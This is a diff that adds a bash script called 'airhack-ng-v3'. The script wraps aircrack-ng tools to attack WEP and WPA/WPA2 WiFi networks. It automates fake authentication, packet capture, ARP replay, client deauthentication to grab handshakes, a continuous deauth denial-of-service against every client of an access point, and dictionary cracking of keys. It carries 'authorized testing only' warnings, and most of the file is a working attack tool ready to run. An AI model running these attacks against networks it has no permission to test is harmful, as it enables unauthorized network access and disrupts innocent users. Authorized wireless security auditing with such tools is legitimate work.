@@ -1,0 +1,598 @@
+#!/bin/bash
+# Original project started by Bitwise Operator on Dec.14.2009
+# v3.0 Modernized for 2026 - Updated for modern Linux systems
+#
+# WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY
+# - Only use on networks you own or have explicit written permission to test
+# - Unauthorized access to computer networks is illegal
+# - This is for educational purposes and legitimate penetration testing
+#
+# Wrapper for WEP/WPA security auditing with the Aircrack-ng suite
+#
+# Requirements: aircrack-ng, iw, ip, wireless adapter with monitor mode support
+
+## Script Info ##
+SCRIPT_NAME='airhack-ng-v3'
+SCRIPT_VERSION='v3.0'
+SCRIPT_COPYRIGHT='No Copyright 2026, Updated by Claude. Published under the Free Public License.'
+
+## Directories ##
+AIRHACK_NG_DIR="${HOME}/airhack-ng/"
+mkdir -p "${AIRHACK_NG_DIR}"
+
+## Parameters ##
+ARGS=("$@")
+CNT=0
+CURR_STRNG=""
+SCAN=0
+COMMND1=0
+CAPTURE_IVS=0
+COMMND3=0
+SAVE_SETTINGS=0
+GET_SETTINGS=0
+SHOWDATA=0
+ENABLE_MONITOR=0
+DISABLE_MONITOR=0
+ERROR_CHOICE=0
+GET_KEY=0
+DICTIONARY_ATTACK=0
+MDOS_ATTACK=0
+WPA_HANDSHAKE=0
+
+## Network Parameters ##
+ADAPTER=""
+ESSID=""
+CHANNEL=""
+BSSID=""
+OWN_MAC=""
+CLIENT_MAC=""
+KEY=""
+DICTIONARY=""
+MON_INTERFACE=""
+
+## Terminal Emulator ##
+TERMINAL_CMD=""
+TERMINAL_ENABLE=0
+
+## Color codes ##
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+###############################################################################
+# Functions
+###############################################################################
+
+function check_root() {
+    if [ "$EUID" -ne 0 ]; then
+        echo -e "${RED}[!] This script requires root privileges${NC}"
+        echo -e "${YELLOW}[*] Please run with sudo: sudo $0 ${ARGS[@]}${NC}"
+        exit 1
+    fi
+}
+
+function check_dependencies() {
+    local missing_deps=0
+    local deps=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "iw" "ip")
+
+    echo -e "${BLUE}[*] Checking dependencies...${NC}"
+    for dep in "${deps[@]}"; do
+        if ! command -v "$dep" &> /dev/null; then
+            echo -e "${RED}[!] Missing: $dep${NC}"
+            missing_deps=1
+        fi
+    done
+
+    if [ $missing_deps -eq 1 ]; then
+        echo -e "${RED}[!] Please install aircrack-ng suite and wireless tools${NC}"
+        echo -e "${YELLOW}[*] Ubuntu/Debian: sudo apt install aircrack-ng${NC}"
+        exit 1
+    fi
+    echo -e "${GREEN}[✓] All dependencies found${NC}"
+}
+
+function detect_terminal() {
+    if [ "$TERMINAL_ENABLE" -eq 1 ]; then
+        if command -v konsole &> /dev/null; then
+            TERMINAL_CMD="konsole --hold --new-tab -e"
+        elif command -v gnome-terminal &> /dev/null; then
+            TERMINAL_CMD="gnome-terminal -- bash -c"
+        elif command -v xterm &> /dev/null; then
+            TERMINAL_CMD="xterm -hold -e"
+        elif command -v terminator &> /dev/null; then
+            TERMINAL_CMD="terminator -x"
+        else
+            echo -e "${YELLOW}[!] No supported terminal emulator found, running in current terminal${NC}"
+            TERMINAL_CMD=""
+            TERMINAL_ENABLE=0
+        fi
+    fi
+}
+
+function get_wireless_interfaces() {
+    echo -e "${BLUE}[*] Available wireless interfaces:${NC}"
+    iw dev | grep Interface | awk '{print "  - " $2}'
+}
+
+function get_own_mac() {
+    if [ -n "$ADAPTER" ]; then
+        OWN_MAC=$(ip link show "$ADAPTER" 2>/dev/null | grep link/ether | awk '{print $2}')
+        if [ -z "$OWN_MAC" ]; then
+            echo -e "${RED}[!] Could not get MAC address for $ADAPTER${NC}"
+        fi
+    fi
+}
+
+function get_monitor_interface() {
+    # Check for existing monitor interfaces
+    MON_INTERFACE=$(iw dev | grep -A 1 "type monitor" | grep Interface | awk '{print $2}' | head -n 1)
+    if [ -z "$MON_INTERFACE" ]; then
+        # Try legacy mon0, mon1, etc.
+        for i in {0..5}; do
+            if iw dev | grep -q "mon$i"; then
+                MON_INTERFACE="mon$i"
+                break
+            fi
+        done
+    fi
+}
+
+function save_settings() {
+    if [ "$SAVE_SETTINGS" -eq 1 ]; then
+        local settings_file="${AIRHACK_NG_DIR}${ESSID}.net"
+        {
+            echo "ADAPTER=${ADAPTER}"
+            echo "CHANNEL=${CHANNEL}"
+            echo "BSSID=${BSSID}"
+            echo "OWN_MAC=${OWN_MAC}"
+            echo "CLIENT_MAC=${CLIENT_MAC}"
+        } > "$settings_file"
+        echo -e "${GREEN}[✓] Saved settings to ${ESSID}.net${NC}"
+    fi
+}
+
+function get_settings_from_file() {
+    if [ "$GET_SETTINGS" -eq 1 ]; then
+        local filename="${AIRHACK_NG_DIR}${ESSID}.net"
+        if [ -f "$filename" ]; then
+            # Source the file safely
+            while IFS='=' read -r key value; do
+                case "$key" in
+                    ADAPTER) [ -z "$ADAPTER" ] && ADAPTER="$value" ;;
+                    CHANNEL) [ -z "$CHANNEL" ] && CHANNEL="$value" ;;
+                    BSSID) [ -z "$BSSID" ] && BSSID="$value" ;;
+                    OWN_MAC) [ -z "$OWN_MAC" ] && OWN_MAC="$value" ;;
+                    CLIENT_MAC) [ -z "$CLIENT_MAC" ] && CLIENT_MAC="$value" ;;
+                    KEY) KEY="$value" ;;
+                esac
+            done < "$filename"
+            echo -e "${GREEN}[✓] Loaded settings from ${ESSID}.net${NC}"
+        else
+            if [ "$ERROR_CHOICE" -eq 0 ]; then
+                ERROR_CHOICE=3
+                report_error
+            fi
+        fi
+    fi
+}
+
+function get_params() {
+    if [ ${#ARGS[@]} -eq 0 ]; then
+        ERROR_CHOICE=4
+        report_error
+    fi
+
+    CNT=0
+    for arg in "${ARGS[@]}"; do
+        CURR_STRNG="${ARGS[$CNT]}"
+        case "$CURR_STRNG" in
+            -h|--help) usage ;;
+            -a) ADAPTER="${ARGS[$((CNT+1))]}" ;;
+            -e) ESSID="${ARGS[$((CNT+1))]}" ;;
+            -c) CHANNEL="${ARGS[$((CNT+1))]}" ;;
+            -b) BSSID="${ARGS[$((CNT+1))]}" ;;
+            -m) OWN_MAC="${ARGS[$((CNT+1))]}" ;;
+            -s) CLIENT_MAC="${ARGS[$((CNT+1))]}" ;;
+            -k) TERMINAL_ENABLE=1 ;;
+            -1) COMMND1=1 ;;
+            -2) CAPTURE_IVS=1 ;;
+            -3) COMMND3=1 ;;
+            -4) DICTIONARY_ATTACK=1 ;;
+            -5) WPA_HANDSHAKE=1 ;;
+            -6) MDOS_ATTACK=1 ;;
+            -i)
+                if [ -z "$ESSID" ]; then
+                    ERROR_CHOICE=1
+                    report_error
+                else
+                    if [ ! -f "${AIRHACK_NG_DIR}${ESSID}.net" ]; then
+                        ERROR_CHOICE=3
+                        report_error
+                    else
+                        GET_SETTINGS=1
+                    fi
+                fi
+                ;;
+            -g) get_own_mac ;;
+            -l)
+                echo -e "${BLUE}[*] Saved network configurations:${NC}"
+                for file in "${AIRHACK_NG_DIR}"*.net; do
+                    if [ -f "$file" ]; then
+                        echo -e "\n${GREEN}$file${NC}"
+                        cat "$file"
+                    fi
+                done
+                exit 0
+                ;;
+            --scan) SCAN=1 ;;
+            --get_key) GET_KEY=1 ;;
+            --save) SAVE_SETTINGS=1 ;;
+            -em|--enable_monitor) ENABLE_MONITOR=1 ;;
+            -dm|--disable_monitor) DISABLE_MONITOR=1 ;;
+            --dict) DICTIONARY="${ARGS[$((CNT+1))]}" ;;
+            --show) SHOWDATA=1 ;;
+        esac
+        CNT=$((CNT+1))
+    done
+}
+
+function report_error() {
+    if [ "$ERROR_CHOICE" -ne 0 ]; then
+        case $ERROR_CHOICE in
+            1) echo -e "${RED}[!] Please supply ESSID: $SCRIPT_NAME -e {ESSID} ${ARGS[*]}${NC}" ;;
+            2) echo -e "${RED}[!] Please supply WiFi Adapter: $SCRIPT_NAME -a {ADAPTER} ${ARGS[*]}${NC}" ;;
+            3) echo -e "${RED}[!] File does not exist. Please save first or load existing ESSID filename${NC}" ;;
+            4) echo -e "${RED}[!] No parameters supplied${NC}" ;;
+            5) echo -e "${RED}[!] No dictionary file supplied${NC}" ;;
+        esac
+        usage
+        exit 1
+    fi
+}
+
+function usage() {
+    cat << EOF
+${BLUE}${SCRIPT_NAME} ${SCRIPT_VERSION}${NC}
+${SCRIPT_COPYRIGHT}
+
+${RED}WARNING: FOR AUTHORIZED SECURITY TESTING ONLY${NC}
+Only use on networks you own or have explicit written permission to test.
+
+${YELLOW}Usage:${NC} $SCRIPT_NAME [params] [value] ...
+
+${GREEN}Network Parameters:${NC}
+  -a {value}           WiFi adapter interface name
+  -e {value}           Target ESSID (network name)
+  -b {value}           Target BSSID (AP MAC address)
+  -c {value}           WiFi channel
+  -s {value}           Client MAC address
+  -m {value}           Your MAC address (or use -g to auto-detect)
+  -g                   Auto-detect your MAC address from adapter
+
+${GREEN}Actions:${NC}
+  --scan               Scan for available networks
+  -em, --enable_monitor    Enable monitor mode on adapter
+  -dm, --disable_monitor   Disable monitor mode
+  -1                   Fake authentication (WEP)
+  -2                   Capture IVs/packets to file
+  -3                   ARP replay attack (increase traffic)
+  -4                   Dictionary attack (WPA/WPA2)
+  -5                   Capture WPA handshake
+  -6                   Deauth attack (MDOS)
+  --get_key            Extract key from capture file
+
+${GREEN}Options:${NC}
+  -k                   Open commands in new terminal tabs
+  --save               Save settings to <ESSID>.net file
+  -i                   Import settings from saved file
+  -l                   List saved configuration files
+  --dict {file}        Dictionary file for WPA cracking
+  --show               Show current configuration
+  -h, --help           Show this help message
+
+${YELLOW}Examples:${NC}
+
+${BLUE}Initial setup:${NC}
+  sudo $SCRIPT_NAME -a wlan0 --scan
+  sudo $SCRIPT_NAME -a wlan0 --enable_monitor
+
+${BLUE}WEP Attack:${NC}
+  sudo $SCRIPT_NAME -e "TargetNet" -a wlan0 -c 6 -b AA:BB:CC:DD:EE:FF -g --save
+  sudo $SCRIPT_NAME -e "TargetNet" -i -k -1 -2 -3
+  sudo $SCRIPT_NAME -e "TargetNet" -i --get_key
+
+${BLUE}WPA/WPA2 Attack:${NC}
+  sudo $SCRIPT_NAME -e "TargetNet" -a wlan0 -c 6 -b AA:BB:CC:DD:EE:FF -s 11:22:33:44:55:66 -g --save
+  sudo $SCRIPT_NAME -e "TargetNet" -i -k -2 -5
+  sudo $SCRIPT_NAME -e "TargetNet" -i -4 --dict /path/to/wordlist.txt
+
+EOF
+    exit 0
+}
+
+function enable_monitor() {
+    if [ "$ENABLE_MONITOR" -eq 1 ]; then
+        if [ -z "$ADAPTER" ]; then
+            ERROR_CHOICE=2
+            report_error
+        fi
+
+        get_monitor_interface
+        if [ -n "$MON_INTERFACE" ]; then
+            echo -e "${YELLOW}[!] Monitor mode already enabled on $MON_INTERFACE${NC}"
+            return
+        fi
+
+        echo -e "${BLUE}[*] Enabling monitor mode on $ADAPTER${NC}"
+
+        # Kill interfering processes
+        airmon-ng check kill &>/dev/null
+
+        # Enable monitor mode using airmon-ng
+        airmon-ng start "$ADAPTER" ${CHANNEL:+"$CHANNEL"} &>/dev/null
+
+        # Verify monitor mode was enabled
+        sleep 2
+        get_monitor_interface
+
+        if [ -n "$MON_INTERFACE" ]; then
+            echo -e "${GREEN}[✓] Monitor mode enabled on $MON_INTERFACE${NC}"
+        else
+            echo -e "${RED}[!] Failed to enable monitor mode${NC}"
+            exit 1
+        fi
+    fi
+}
+
+function disable_monitor() {
+    if [ "$DISABLE_MONITOR" -eq 1 ]; then
+        if [ -z "$ADAPTER" ]; then
+            ERROR_CHOICE=2
+            report_error
+        fi
+
+        get_monitor_interface
+        if [ -z "$MON_INTERFACE" ]; then
+            echo -e "${YELLOW}[!] Monitor mode already disabled${NC}"
+            return
+        fi
+
+        echo -e "${BLUE}[*] Disabling monitor mode${NC}"
+        airmon-ng stop "$MON_INTERFACE" &>/dev/null
+
+        # Restart networking
+        systemctl restart NetworkManager &>/dev/null || service network-manager restart &>/dev/null
+
+        echo -e "${GREEN}[✓] Monitor mode disabled${NC}"
+    fi
+}
+
+function scan_networks() {
+    if [ "$SCAN" -eq 1 ]; then
+        if [ -z "$ADAPTER" ]; then
+            ERROR_CHOICE=2
+            report_error
+        fi
+
+        get_monitor_interface
+        local scan_iface="${MON_INTERFACE:-$ADAPTER}"
+
+        echo -e "${BLUE}[*] Scanning for networks on $scan_iface${NC}"
+        echo -e "${YELLOW}[*] Press Ctrl+C to stop scanning${NC}"
+
+        if [ -n "$TERMINAL_CMD" ]; then
+            $TERMINAL_CMD "airodump-ng $scan_iface"
+        else
+            airodump-ng "$scan_iface"
+        fi
+    fi
+}
+
+function deauth_attack() {
+    if [ "$COMMND1" -eq 1 ]; then
+        get_monitor_interface
+        if [ -z "$MON_INTERFACE" ]; then
+            echo -e "${YELLOW}[!] Monitor mode not enabled, enabling now...${NC}"
+            ENABLE_MONITOR=1
+            enable_monitor
+            get_monitor_interface
+        fi
+
+        echo -e "${BLUE}[*] Starting fake authentication attack${NC}"
+        echo -e "${YELLOW}[*] Command: aireplay-ng -1 10 -q 5 -e \"$ESSID\" -a $BSSID -h $OWN_MAC $MON_INTERFACE${NC}"
+        read -n 1 -p "Press [Enter] to continue or [Ctrl+C] to abort: "
+        echo
+
+        if [ -n "$TERMINAL_CMD" ]; then
+            $TERMINAL_CMD "aireplay-ng -1 10 -q 5 -e \"$ESSID\" -a $BSSID -h $OWN_MAC $MON_INTERFACE; bash" &
+        else
+            aireplay-ng -1 10 -q 5 -e "$ESSID" -a "$BSSID" -h "$OWN_MAC" "$MON_INTERFACE"
+        fi
+    fi
+}
+
+function capture_ivs() {
+    if [ "$CAPTURE_IVS" -eq 1 ]; then
+        get_monitor_interface
+        local output_file="${AIRHACK_NG_DIR}${ESSID}"
+
+        echo -e "${BLUE}[*] Starting packet capture${NC}"
+        echo -e "${YELLOW}[*] Output file: ${output_file}-01.cap${NC}"
+        echo -e "${YELLOW}[*] Command: airodump-ng -c $CHANNEL --bssid $BSSID -w $output_file $MON_INTERFACE${NC}"
+        read -n 1 -p "Press [Enter] to continue or [Ctrl+C] to abort: "
+        echo
+
+        if [ -n "$TERMINAL_CMD" ]; then
+            $TERMINAL_CMD "airodump-ng -c $CHANNEL --bssid $BSSID -w $output_file $MON_INTERFACE; bash" &
+        else
+            airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$output_file" "$MON_INTERFACE"
+        fi
+    fi
+}
+
+function arp_request() {
+    if [ "$COMMND3" -eq 1 ]; then
+        get_monitor_interface
+
+        echo -e "${BLUE}[*] Starting ARP replay attack${NC}"
+        echo -e "${YELLOW}[*] Command: aireplay-ng -3 -b $BSSID -h $OWN_MAC $MON_INTERFACE${NC}"
+        read -n 1 -p "Press [Enter] to continue or [Ctrl+C] to abort: "
+        echo
+
+        if [ -n "$TERMINAL_CMD" ]; then
+            $TERMINAL_CMD "aireplay-ng -3 -b $BSSID -h $OWN_MAC $MON_INTERFACE; bash" &
+        else
+            aireplay-ng -3 -b "$BSSID" -h "$OWN_MAC" "$MON_INTERFACE"
+        fi
+    fi
+}
+
+function wpa_handshake_capture() {
+    if [ "$WPA_HANDSHAKE" -eq 1 ]; then
+        get_monitor_interface
+
+        echo -e "${BLUE}[*] Deauthenticating client to capture WPA handshake${NC}"
+        echo -e "${YELLOW}[*] Command: aireplay-ng -0 5 -a $BSSID -c $CLIENT_MAC $MON_INTERFACE${NC}"
+        read -n 1 -p "Press [Enter] to continue or [Ctrl+C] to abort: "
+        echo
+
+        aireplay-ng -0 5 -a "$BSSID" -c "$CLIENT_MAC" "$MON_INTERFACE"
+        echo -e "${GREEN}[✓] Deauth packets sent. Check airodump-ng for handshake capture.${NC}"
+    fi
+}
+
+function mdos_attack() {
+    if [ "$MDOS_ATTACK" -eq 1 ]; then
+        get_monitor_interface
+
+        echo -e "${RED}[!] WARNING: This will disconnect all clients from the target AP${NC}"
+        echo -e "${YELLOW}[*] Command: aireplay-ng -0 0 -a $BSSID $MON_INTERFACE${NC}"
+        read -n 1 -p "Press [Enter] to continue or [Ctrl+C] to abort: "
+        echo
+
+        if [ -n "$TERMINAL_CMD" ]; then
+            $TERMINAL_CMD "aireplay-ng -0 0 -a $BSSID $MON_INTERFACE; bash" &
+        else
+            aireplay-ng -0 0 -a "$BSSID" "$MON_INTERFACE"
+        fi
+    fi
+}
+
+function get_key() {
+    if [ "$GET_KEY" -eq 1 ]; then
+        local capture_file="${AIRHACK_NG_DIR}${ESSID}-01.cap"
+
+        if [ ! -f "$capture_file" ]; then
+            echo -e "${RED}[!] Capture file not found: $capture_file${NC}"
+            exit 1
+        fi
+
+        echo -e "${BLUE}[*] Attempting to crack key from $capture_file${NC}"
+
+        if [ -n "$TERMINAL_CMD" ]; then
+            $TERMINAL_CMD "aircrack-ng \"$capture_file\"; bash"
+        else
+            aircrack-ng "$capture_file"
+        fi
+
+        if [ "$SAVE_SETTINGS" -eq 1 ]; then
+            # Extract and save key if found
+            local key_result=$(aircrack-ng "$capture_file" | grep "KEY FOUND" | sed 's/.*\[ \(.*\) \]/\1/')
+            if [ -n "$key_result" ]; then
+                echo "KEY=$key_result" >> "${AIRHACK_NG_DIR}${ESSID}.net"
+                echo -e "${GREEN}[✓] Key saved to ${ESSID}.net${NC}"
+            fi
+        fi
+    fi
+}
+
+function dictionary_attack() {
+    if [ "$DICTIONARY_ATTACK" -eq 1 ]; then
+        if [ -z "$DICTIONARY" ]; then
+            ERROR_CHOICE=5
+            report_error
+        fi
+
+        if [ ! -f "$DICTIONARY" ]; then
+            echo -e "${RED}[!] Dictionary file not found: $DICTIONARY${NC}"
+            exit 1
+        fi
+
+        local capture_file="${AIRHACK_NG_DIR}${ESSID}-01.cap"
+
+        if [ ! -f "$capture_file" ]; then
+            echo -e "${RED}[!] Capture file not found: $capture_file${NC}"
+            exit 1
+        fi
+
+        echo -e "${BLUE}[*] Starting WPA/WPA2 dictionary attack${NC}"
+        echo -e "${YELLOW}[*] Dictionary: $DICTIONARY${NC}"
+        echo -e "${YELLOW}[*] Capture: $capture_file${NC}"
+
+        if [ -n "$TERMINAL_CMD" ]; then
+            $TERMINAL_CMD "aircrack-ng -w \"$DICTIONARY\" -b \"$BSSID\" \"$capture_file\"; bash"
+        else
+            aircrack-ng -w "$DICTIONARY" -b "$BSSID" "$capture_file"
+        fi
+    fi
+}
+
+function show_data() {
+    if [ "$SHOWDATA" -eq 1 ]; then
+        get_monitor_interface
+        echo -e "${BLUE}================================================${NC}"
+        echo -e "${GREEN}Current Configuration:${NC}"
+        echo -e "  WiFi Adapter:      ${ADAPTER:-<not set>}"
+        echo -e "  Channel:           ${CHANNEL:-<not set>}"
+        echo -e "  Target BSSID:      ${BSSID:-<not set>}"
+        echo -e "  Target ESSID:      ${ESSID:-<not set>}"
+        echo -e "  Your MAC:          ${OWN_MAC:-<not set>}"
+        echo -e "  Client MAC:        ${CLIENT_MAC:-<not set>}"
+        echo -e "  Monitor Interface: ${MON_INTERFACE:-<not enabled>}"
+        echo -e "  Terminal Mode:     $([ $TERMINAL_ENABLE -eq 1 ] && echo 'Enabled' || echo 'Disabled')"
+        echo -e "  Settings File:     $([ $GET_SETTINGS -eq 1 ] && echo \"${ESSID}.net\" || echo '<none>')"
+        echo -e "  Saved KEY:         ${KEY:-<none>}"
+        echo -e "${BLUE}================================================${NC}"
+    fi
+}
+
+###############################################################################
+# Main Program
+###############################################################################
+
+# Check if running as root
+check_root
+
+# Check dependencies
+check_dependencies
+
+# Parse parameters
+get_params
+
+# Load settings from file if requested
+get_settings_from_file
+
+# Detect terminal emulator
+detect_terminal
+
+# Save settings if requested
+save_settings
+
+# Show configuration if requested
+show_data
+
+# Execute actions
+enable_monitor
+disable_monitor
+scan_networks
+deauth_attack
+capture_ivs
+arp_request
+wpa_handshake_capture
+mdos_attack
+get_key
+dictionary_attack
+
+echo -e "${GREEN}[✓] Done${NC}"
